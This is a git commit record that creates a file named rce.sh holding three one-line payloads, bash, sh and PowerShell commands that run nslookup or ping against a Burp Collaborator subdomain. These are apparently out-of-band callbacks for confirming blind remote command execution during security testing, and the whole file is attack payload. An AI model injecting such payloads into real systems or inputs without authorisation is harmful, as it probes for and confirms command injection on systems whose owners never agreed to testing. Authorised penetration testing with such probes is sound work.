60767d9b35b6cf30d91f8605753e4322a2ee87dc
Yassine Bourki <76617694+YaS5in3@users.noreply.github.com>
2022-10-30 23:54:09 +0100

    Create rce.sh

---
+++ rce.sh
@@ -0,0 +1,3 @@
+bash -c "nslookup gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
+sh -c "nslookup gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
+powershell -c "ping gm6mkkpfv74dhr4d3tr0h6d9g0mtai.burpcollaborator.net"
